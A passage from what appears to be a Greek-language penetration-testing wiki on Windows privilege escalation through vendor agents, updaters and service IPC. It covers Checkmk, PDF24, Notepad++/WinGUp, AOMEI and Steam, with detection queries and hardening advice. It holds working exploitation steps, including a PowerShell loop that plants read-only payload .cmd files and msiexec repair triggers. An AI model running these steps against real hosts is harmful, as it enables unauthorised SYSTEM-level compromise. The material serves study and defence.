Γενικό συμπέρασμα: όταν κάνετε reverse engineering σε «helper» suites, μην περιορίζεστε στο localhost TCP ή στα named pipes. Ελέγξτε για COM classes με ονόματα όπως `Elevator`, `Launcher`, `Updater` ή `Utility` και, στη συνέχεια, επαληθεύστε αν η privileged service επικυρώνει η ίδια το binary-στόχο ή απλώς εμπιστεύεται ένα αποτέλεσμα που υπολογίζει ένα patchable user-mode client DLL. Αυτό το μοτίβο γενικεύεται πέρα από τη Razer: κάθε σχεδιασμός με διαχωρισμένους ρόλους, όπου ο high-privilege broker λαμβάνει απόφαση allow/deny από την low-privilege πλευρά, αποτελεί πιθανή επιφάνεια privesc.


---
## Εκτέλεση προβλέψιμου temp script κατά την επιδιόρθωση MSI (Checkmk Agent / CVE-2024-0670)

Ορισμένοι Windows agents εξακολουθούν να υλοποιούν privileged ενέργειες γράφοντας ένα προσωρινό `.cmd` στο `C:\Windows\Temp` και εκτελώντας το ως `SYSTEM`. Αν το όνομα του αρχείου είναι προβλέψιμο και η service δεν δημιουργεί με ασφαλή τρόπο τα αρχεία που υπάρχουν ήδη, ένας χρήστης με χαμηλά προνόμια μπορεί να δημιουργήσει εκ των προτέρων το μελλοντικό temp file ως **read-only** και να κάνει την privileged process να εκτελέσει περιεχόμενο ελεγχόμενο από τον attacker αντί για το δικό της script.

Παρατηρήθηκε σε ευάλωτα builds του Checkmk Agent:
- μοτίβο temp: `cmk_all_<PID>_1.cmd`
- επηρεαζόμενοι κλάδοι: `2.0.0`, `2.1.0`, `2.2.0`
- έναυσμα: **repair** του cached agent package MSI<sup>[[8]](#references)[[9]](#references)</sup>

Πρακτική ροή εργασίας:
1. Υπολογίστε ένα ρεαλιστικό εύρος PID από τα τρέχοντα process IDs ή το PID του agent που εκτελείται.
2. Γράψτε ένα σύντομο **ASCII** payload `.cmd` (`Set-Content -Encoding Ascii` ή ανακατεύθυνση `cmd.exe`· αποφύγετε την έξοδο PowerShell σε UTF-16 για batch files).
3. Δημιουργήστε μαζικά αρχεία `C:\Windows\Temp\cmk_all_<PID>_1.cmd` για το υποψήφιο εύρος και ορίστε κάθε αρχείο ως read-only.
4. Ενεργοποιήστε repair του cached MSI, ώστε η privileged service να προσπαθήσει να δημιουργήσει ξανά το temp script και, στη συνέχεια, να το εκτελέσει.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Εάν το ευάλωτο προϊόν είναι εγκατεστημένο μέσω Windows Installer, αντιστοιχίστε το MSI με την τυχαία ονομασία που είναι αποθηκευμένο στην cache του `C:\Windows\Installer` με το όνομα του προϊόντος πριν ενεργοποιήσετε την επιδιόρθωση:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Λειτουργικές σημειώσεις:
- Το `qwinsta` είναι χρήσιμο όταν το `msiexec /fa` αποτυγχάνει από μη διαδραστικό WinRM shell και χρειάζεται να καταλάβετε αν μια υπάρχουσα συνεδρία desktop/αποσυνδεδεμένη μπορεί να ενεργοποιήσει σωστά την επιδιόρθωση.<sup>[[7]](#references)</sup>
- Αυτό το μοτίβο γενικεύεται σε άλλους endpoint agents και updaters που **τοποθετούν προσωρινά scripts σε τοποθεσίες με δικαιώματα εγγραφής για όλους και αργότερα τα εκτελούν ως SYSTEM**. Ελέγξτε για προβλέψιμα ονόματα, απουσία αποκλειστικής δημιουργίας αρχείων και ροές επιδιόρθωσης/ενημέρωσης που μπορούν να ενεργοποιηθούν κατά βούληση.

### Επιδιόρθωση διαδραστικού installer και προνομιούχα κονσόλα

Το PDF24 Creator 11.15.1 παρουσιάζει έναν ξεχωριστό κίνδυνο επιδιόρθωσης MSI: η custom action εγκατάστασης εκτυπωτή μπορεί να ανοίξει ορατή κονσόλα με δικαιώματα SYSTEM κατά την επιδιόρθωση. Ο προμηθευτής τροποποίησε τον MSI installer στην έκδοση 11.15.2 για να αντιμετωπίσει αυτή τη συμπεριφορά. Μια παλαιότερη έκδοση προϊόντος αποτελεί μόνο ένδειξη για περαιτέρω διερεύνηση. Ελέγξτε το καταχωρισμένο ή προσβάσιμο πακέτο MSI, αν ο συγκεκριμένος χρήστης μπορεί να ξεκινήσει επιδιόρθωση, αν υπάρχουν η ευάλωτη custom action και η καθυστέρηση του αρχείου καταγραφής, καθώς και αν ένα διαδραστικό desktop μπορεί να εμφανίσει την κονσόλα. Η αναφερόμενη καθυστέρηση χρησιμοποιούσε oplock στο `faxPrnInst.log`· η απλή δυνατότητα εγγραφής στο αρχείο δεν είναι η μόνη προϋπόθεση πρόσβασης. Ένα μη διαδραστικό shell, ένα απρόσιτο πακέτο ή ένας ενημερωμένος installer μπορούν να διακόψουν την αλυσίδα. Αυτό το ζήτημα δεν εξαρτάται από το `AlwaysInstallElevated` και διαφέρει από την αντικατάσταση ενός προβλέψιμου προσωρινού script.

---
## Απομακρυσμένη παραβίαση της αλυσίδας εφοδιασμού μέσω ανεπαρκούς επικύρωσης updater (WinGUp / Notepad++)

Μεταξύ Ιουνίου 2025 και Δεκεμβρίου 2025, επιτιθέμενοι που παραβίασαν την υποδομή φιλοξενίας πίσω από τη ροή ενημερώσεων του Notepad++ έστελναν επιλεκτικά κακόβουλα manifests σε επιλεγμένα θύματα. Οι παλαιότεροι updaters που βασίζονταν στο WinGUp δεν επαλήθευαν πλήρως τη γνησιότητα των ενημερώσεων, οπότε μια κακόβουλη απόκριση XML μπορούσε να ανακατευθύνει τους clients σε URL που έλεγχαν οι επιτιθέμενοι. Επειδή ο client δεχόταν περιεχόμενο HTTPS χωρίς να επιβάλλει ταυτόχρονα έμπιστη αλυσίδα πιστοποιητικών και έγκυρη υπογραφή PE στο ληφθέν installer, τα θύματα κατέβαζαν και εκτελούσαν ένα trojanized NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Λειτουργική ροή (δεν απαιτείται τοπικό exploit):
1. **Παρεμβολή στην υποδομή**: παραβιάστε το CDN/hosting και απαντήστε στους ελέγχους ενημέρωσης με metadata του επιτιθέμενου που παραπέμπουν σε κακόβουλο URL λήψης.
2. **Trojanized NSIS**: ο installer λαμβάνει/εκτελεί ένα payload και καταχράται δύο αλυσίδες εκτέλεσης:
   - **Bring-your-own signed binary + sideload**: συμπεριλάβετε το υπογεγραμμένο `BluetoothService.exe` της Bitdefender και τοποθετήστε ένα κακόβουλο `log.dll` στη διαδρομή αναζήτησής του. Όταν εκτελεστεί το υπογεγραμμένο binary, τα Windows φορτώνουν μέσω sideload το `log.dll`, το οποίο αποκρυπτογραφεί και φορτώνει ανακλαστικά το backdoor Chrysalis (προστατευμένο με Warbird + κατακερματισμός API για να δυσχεραίνεται ο στατικός εντοπισμός).
   - **Έγχυση shellcode μέσω script**: το NSIS εκτελεί ένα μεταγλωττισμένο Lua script που χρησιμοποιεί Win32 APIs (π.χ., `EnumWindowStationsW`) για να εγχύσει shellcode και να προετοιμάσει το Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Συμπεράσματα για hardening/εντοπισμό για κάθε auto-updater:
- Επιβάλετε **επαλήθευση πιστοποιητικού + υπογραφής** του ληφθέντος installer (καρφιτσώστε τον signer του προμηθευτή, απορρίψτε ασύμφωνα CN/αλυσίδες) και υπογράψτε και το update manifest (π.χ., XMLDSig). Αποκλείστε ανακατευθύνσεις που ελέγχονται από το manifest, εκτός αν έχουν επικυρωθεί.
- Αντιμετωπίστε το **BYO signed binary sideloading** ως σημείο διερεύνησης μετά τη λήψη: δημιουργήστε ειδοποίηση όταν ένα υπογεγραμμένο EXE προμηθευτή φορτώνει DLL με όνομα που βρίσκεται εκτός της κανονικής διαδρομής εγκατάστασής του (π.χ., η Bitdefender φορτώνει το `log.dll` από Temp/Downloads) και όταν ένας updater τοποθετεί ή εκτελεί installers από προσωρινή τοποθεσία με υπογραφές που δεν ανήκουν στον προμηθευτή.
- Παρακολουθείτε **artefacts ειδικά για το malware** που παρατηρήθηκαν σε αυτή την αλυσίδα (χρήσιμα ως γενικά σημεία διερεύνησης): το mutex `Global\Jdhfv_1.0.1`, ασυνήθιστες εγγραφές του `gup.exe` στο `%TEMP%` και στάδια έγχυσης shellcode μέσω Lua.
- Το Notepad++ απάντησε ενισχύοντας το WinGUp στην έκδοση v8.8.9 και τις νεότερες: το επιστρεφόμενο XML υπογράφεται πλέον (XMLDSig), ενώ οι νεότερες εκδόσεις επιβάλλουν επαλήθευση πιστοποιητικού + υπογραφής του ληφθέντος installer αντί να εμπιστεύονται μόνο το transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Sideloading υπογεγραμμένου από Bitdefender EXE με <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> που εκκινεί ένα πρόγραμμα εγκατάστασης που δεν είναι του Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Αυτά τα μοτίβα γενικεύονται σε κάθε updater που δέχεται unsigned manifests ή δεν επαληθεύει τους υπογράφοντες των installers: network hijack + malicious installer + BYO-signed sideloading οδηγούν σε remote code execution υπό το πρόσχημα «έμπιστων» updates.

### Η διαμόρφωση ειδοποιήσεων ως δεύτερο trigger update

Ένας updater μπορεί να χρησιμοποιεί ξεχωριστές remote configurations για να **προετοιμάζει περιεχόμενο και να ενεργοποιεί την εκτέλεσή του**. Αυτό απαιτεί έλεγχο των configurations ή των αποκρίσεών τους· οι αναφορές δεν διευκρινίζουν πώς αποκτήθηκε πρόσβαση στην πηγή. Στην περίπτωση της AOMEI, το `down_html.ini` επέλεγε ένα archive URL, μια έκδοση (`thrid`) και ένα MD5 (`Val`)· ο attacker αύξησε την έκδοση και άλλαξε ταυτόχρονα το URL και το αντίστοιχο checksum. Πρόκειται για την [αστοχία ορίου εμπιστοσύνης στα metadata](#2-hijacking-the-update-channel-to-run-code-as-system) που καλύφθηκε παραπάνω. Η πρόσθετη διαδρομή εκτέλεσης ήταν το `Notifycfg.ini`: έδινε εντολή στο `ABNotify.exe` να φορτώσει το εξαγόμενο `upgrade-now.html` μέσω ενός τοπικού URL `file:///` σε WebView. Η σελίδα μεταφερόταν αυτόματα σε ένα γειτονικό executable, το οποίο το WebView παρέδιδε στο system shell. Η child process κληρονομούσε τα privileges του notifier· αυτό δεν την ανύψωνε αυτομάτως σε SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Η Google ανέφερε επίσης ένα αλλοιωμένο `Notifycfg.ini` με περισσότερα από 35.000 επαναλαμβανόμενα dummy sections, το οποίο παρέκαμψε τον συνήθη έλεγχο έκδοσης του συγκεκριμένου client. Η αναφορά δεν τεκμηριώνει γενικό parser bypass. Ο attacker επανέφερε τα remote files μετά από χρονικά διαστήματα πέντε έως δέκα λεπτών, οπότε μόνο οι clients που έκαναν polling σε αυτά τα διαστήματα λάμβαναν την τροποποιημένη configuration. Αυτό το notification channel περιλάμβανε επίσης ένα ξεχωριστό [δέλεαρ εξαναγκασμού WebDAV/NTLM](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion), για το οποίο δεν απαιτούνταν να εκτελεστεί το archive.<sup>[[18]](#references)</sup>

---
## Εκκίνηση μέσω shared memory προς privileged service IPC

Μην περιορίζεστε στην απαρίθμηση named pipes. Ένας SYSTEM broker μπορεί να εκθέτει ένα permissive named **file mapping** για την έναρξη της σύνδεσης και έπειτα να αντιγράφει handles anonymous pipes στη διεργασία που ζητά τη σύνδεση. Στη δοκιμασμένη υλοποίηση του Steam, τα `Global\SteamClientService_SharedMemFile` και `Global\SteamClientService_SharedMemLock` συντονίζουν το handshake του client PID/event· η υπηρεσία επιστρέφει δύο pipe handles και τα επόμενα length-prefixed requests χρησιμοποιούν το `RunInterface` (`0x01`). Το DACL του mapping επέτρεπε την πρόσβαση σε clients οποιουδήποτε integrity level. Το εσωτερικό αντικείμενο `CSteamServiceWin32` στο `steamclient64.dll` παρείχε έναν πρακτικό client: εντοπίστε το global που εξαρτάται από το build, καλέστε το vtable slot 0 `Connect` και έπειτα χρησιμοποιήστε τα interface maps αντί να επανυλοποιήσετε το handshake. Η πρόσβαση στο IPC είναι μόνο προαπαιτούμενο· η απόφαση εμπιστοσύνης του privileged handler καθορίζει αν μπορεί να γίνει privilege escalation. <sup>[[19]](#references)[[20]](#references)</sup>

### Το signed manifest επεκτείνεται σε παρωχημένη allowlist executables

Το `IClientInstallUtils::AddInstallScriptToWhiteList` (slot 21) επαληθεύει το `kvsignatures` ενός signed VDF, αλλά καταγράφει το **πλήρως ανεπτυγμένο pathname του executable**, όχι μια αμετάβλητη ταυτότητα αρχείου. Με μια signed καταχώριση `Run Process`, όπως `%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe`, δώστε ένα `%INSTALLDIR%` εγγράψιμο από χρήστη. Τοποθετήστε ένα replacement executable στην ακριβώς ίδια πλήρως ανεπτυγμένη διαδρομή και, στη συνέχεια, καλέστε το `RunInstallScript` (slot 22) με ένα unsigned VDF του οποίου το `Process 1` ορίζει το allowlisted path. Η καταχώριση παραμένει ενεργή μέχρι να γίνει restart της υπηρεσίας· στην αναφερόμενη υλοποίηση δεν γίνεται επαλήθευση του αρχείου πριν από την εκκίνηση ως SYSTEM. Το planted filename πρέπει να ταιριάζει με την πραγματική signed καταχώριση, όχι απλώς με την κατηγορία prerequisite. <sup>[[19]](#references)[[20]](#references)</sup>

### Η child process του module manager παρακάμπτει τον έλεγχο υπογραφής του direct load

Το `IClientModuleManager::LoadModule` (slot 0) δέχεται bytes module όταν το ID που παρέχεται αντιστοιχεί στο CRC32 τους. Το `CallFunctionAsync` (slot 3) με `flags & 8` επιλέγει έναν κλάδο **child process**, αντί για τον κλάδο άμεσης reflective load που επαληθεύει μια υπογραφή Valve. Η υπηρεσία γράφει το `legacycompat\servicecall_<CRC>.dll` και εκκινεί το `legacycompat\steamservice.exe /runfunc ...` από τον φάκελο εγκατάστασης. Αν ο φάκελος είναι εγγράψιμος από χρήστη, τοποθετήστε ένα executable στη δεύτερη διαδρομή, φορτώστε οποιοδήποτε προσωρινό module που ταιριάζει στο CRC και καλέστε την async method με ενεργοποιημένο το bit 3. Στο build που αναφέρθηκε, δεν γινόταν authentication ούτε του child executable ούτε του DLL που είχε γραφτεί στον δίσκο. Το module δεν χρειάζεται να είναι από μόνο του λειτουργικό payload: το substituted child executable είναι αυτό που εκτελείται ως SYSTEM. <sup>[[19]](#references)[[20]](#references)</sup>

### Έλεγχοι μελών catalog πριν από privileged εγκατάσταση driver

Για έναν broker εγκατάστασης driver, ελέγξτε αν η επικύρωση του catalog συνδέεται με **το ακριβές INF που παραδίδεται στον installer**. Στην αναφερόμενη διαδρομή `InstallVrLinkDongleDriver`, το `WinVerifyTrust` επικυρώνει ένα catalog και το `CryptCATAdminCalcHashFromFileHandle` αναζητά *τουλάχιστον ένα* αρχείο που ταιριάζει σε έναν κατάλογο που παρέχει ο caller, αλλά στη συνέχεια η υπηρεσία εκτελεί `pnputil /add-driver ... /install` στο `netrtwlanuval.inf`, χωρίς να διαπιστώνει ότι αυτό το INF είναι το προβλεπόμενο μέλος του catalog. Γίνεται δεκτός ένας επίπεδος κατάλογος ή ένας κατάλογος ειδικός για την αρχιτεκτονική. Επομένως, ένα signed catalog με οποιοδήποτε matching μέλος στον κατάλογο μπορεί να περάσει τον αδύναμο έλεγχο της υπηρεσίας, ακόμη κι αν το INF που παραδίδεται στον privileged installer είναι διαφορετικό. Μην υποθέτετε ότι αυτό και μόνο παρακάμπτει την πολιτική υπογραφής driver των Windows: η επιτυχής εγκατάσταση εξακολουθεί να εξαρτάται από το replacement package και την πολιτική του host. <sup>[[19]](#references)[[20]](#references)</sup>

Η υπηρεσία απελευθερώνει τα handles επικύρωσης πριν το `pnputil` ανοίξει το INF, αφήνοντας ένα [κενό TOCTOU](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk) με sink εγκατάστασης driver αντί για executable update. Ένα oplock μπορεί να συγχρονίσει μια αντικατάσταση μεταξύ του ελέγχου και του ανοίγματος από τον installer. Το ίδιο IPC εκθέτει [προώθηση εισόδου secure desktop](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring), με ξεχωριστές προϋποθέσεις συναίνεσης. <sup>[[19]](#references)</sup>

## References
- [1] [Συμβουλευτικό δελτίο – Netskope Client for Windows – Local Privilege Escalation μέσω Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Συμβουλευτικό δελτίο ασφαλείας NSKPSA-2025-002 της Netskope](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – client/exploit IPC για Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Εκμετάλλευση των ASUS DriverHub, MSI Center, Acer Control Centre και Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation μέσω εγγράψιμων αρχείων στο Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation στον agent των Windows](https://checkmk.com/werk/16361)
- [10] [PoCs του sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [PipeViewer της CyberArk](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Κρατικά υποστηριζόμενοι actors εκμεταλλεύονται την εφοδιαστική αλυσίδα του Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – ενημέρωση για το περιστατικό παραβίασης της υποδομής](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Παράκαμψη της επιδιόρθωσης για το CVE-2025-0309 στο Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Αποκάλυψη σφαλμάτων Privilege Escalation στο Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: Από το gRPC στο SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – Παραβίαση της εφοδιαστικής αλυσίδας του AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group και Mandiant – Διερεύνηση παροδικής αλλοίωσης της εφοδιαστικής αλυσίδας](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
- [19] [Atredis – Turning the Valve](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [20] [Atredis – PoCs του Turning the Valve](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
